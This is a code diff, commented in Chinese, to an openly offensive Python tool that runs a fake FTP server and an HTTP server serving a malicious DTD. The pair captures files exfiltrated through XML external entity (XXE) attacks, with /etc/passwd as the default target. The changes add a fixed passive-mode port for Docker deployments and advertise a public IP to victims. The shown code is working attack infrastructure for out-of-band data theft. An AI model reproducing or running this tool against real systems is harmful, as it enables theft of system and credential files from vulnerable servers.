@@ -72,11 +72,15 @@ def start_http_server(port, public_ip, ftp_port, file_path):
     logging.info(f"[*] DTD Payload URL: http://{public_ip}:{port}/data.dtd")
     server.serve_forever()
 
-def pasv_connection_handler(pasv_socket):
+def pasv_connection_handler(pasv_socket, persistent=False):
     """
     后台线程：处理 PASV 数据连接。
     主要目的是完成 TCP 握手，防止客户端报错，
     实际上 XXE 攻击的数据通常夹带在控制信道的命令中，而非数据信道。
+    
+    Args:
+        pasv_socket: PASV 监听 socket
+        persistent: 如果为 True，处理完连接后不关闭 socket（用于固定端口模式）
     """
     try:
         pasv_socket.settimeout(5.0)
@@ -86,7 +90,8 @@ def pasv_connection_handler(pasv_socket):
     except Exception:
         pass
     finally:
-        pasv_socket.close()
+        if not persistent:
+            pasv_socket.close()
 
 def handle_client(conn, addr, output_file=None):
     """ 处理主控制信道连接 """
@@ -137,24 +142,38 @@ def handle_client(conn, addr, output_file=None):
                 elif cmd_upper.startswith('EPSV'):
                      conn.send(b'502 Command not implemented.\r\n') 
 
-                # === 3. PASV 模式处理 (线程安全版) ===
+                # === 3. PASV 模式处理 (支持固定端口) ===
                 elif cmd_upper.startswith('PASV'):
                     try:
-                        # 绑定随机端口
-                        s_pasv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        s_pasv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                        s_pasv.bind((IP, 0))
-                        s_pasv.listen(1)
+                        # 使用固定端口或随机端口
+                        if PASV_PORT:
+                            # 固定端口模式 - 适用于 Docker 场景
+                            s_pasv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            s_pasv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                            s_pasv.bind(('0.0.0.0', PASV_PORT))
+                            s_pasv.listen(1)
+                            port = PASV_PORT
+                            
+                            # 启动后台线程处理数据连接
+                            t = threading.Thread(target=pasv_connection_handler, args=(s_pasv, False))
+                            t.daemon = True
+                            t.start()
+                        else:
+                            # 随机端口模式 - 适用于非 Docker 场景
+                            s_pasv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            s_pasv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                            s_pasv.bind((IP, 0))
+                            s_pasv.listen(1)
+                            
+                            _, port = s_pasv.getsockname()
+                            
+                            # 启动后台线程等待数据连接
+                            t = threading.Thread(target=pasv_connection_handler, args=(s_pasv, False))
+                            t.daemon = True
+                            t.start()
                         
-                        _, port = s_pasv.getsockname()
-                        
-                        # 启动后台线程等待数据连接，不阻塞主循环
-                        t = threading.Thread(target=pasv_connection_handler, args=(s_pasv,))
-                        t.daemon = True
-                        t.start()
-                        
-                        # 计算并发送 227 响应
-                        ip_parts = IP.split('.')
+                        # 计算并发送 227 响应 (使用 PUBLIC_IP 供客户端连接)
+                        ip_parts = PUBLIC_IP.split('.')
                         p1, p2 = port // 256, port % 256
                         msg = f'227 Entering Passive Mode ({",".join(ip_parts)},{p1},{p2}).\r\n'
                         conn.send(msg.encode())
@@ -244,6 +263,10 @@ if __name__ == '__main__':
                         dest='file_path',
                         default='/etc/passwd',
                         help='要读取的目标文件路径 (默认: /etc/passwd)')
+    parser.add_argument('--pasv-port',
+                        type=int,
+                        dest='pasv_port',
+                        help='固定的被动模式端口 (Docker 场景推荐使用)')
     
     args = parser.parse_args()
     
@@ -251,6 +274,8 @@ if __name__ == '__main__':
     PUBLIC_IP = args.public_ip if args.public_ip else get_host_ip()
     # IP 用于 PASV 模式绑定本地网络接口
     IP = get_host_ip()
+    # PASV_PORT 用于固定被动模式端口 (Docker 场景)
+    PASV_PORT = args.pasv_port
     PORT = args.port
     ADDR_MAIN = ('0.0.0.0', PORT)  # 绑定到所有接口
 
@@ -268,6 +293,10 @@ if __name__ == '__main__':
         server.bind(ADDR_MAIN)
         server.listen(10)
         print(f"[*] XXE Fake FTP Server listening on 0.0.0.0:{PORT} (Public IP: {PUBLIC_IP})")
+        if PASV_PORT:
+            print(f"[*] Passive mode using fixed port: {PASV_PORT}")
+        else:
+            print(f"[*] Passive mode using random ports")
         if args.output_file:
             print(f"[*] Logging captured data to: {args.output_file}")
         
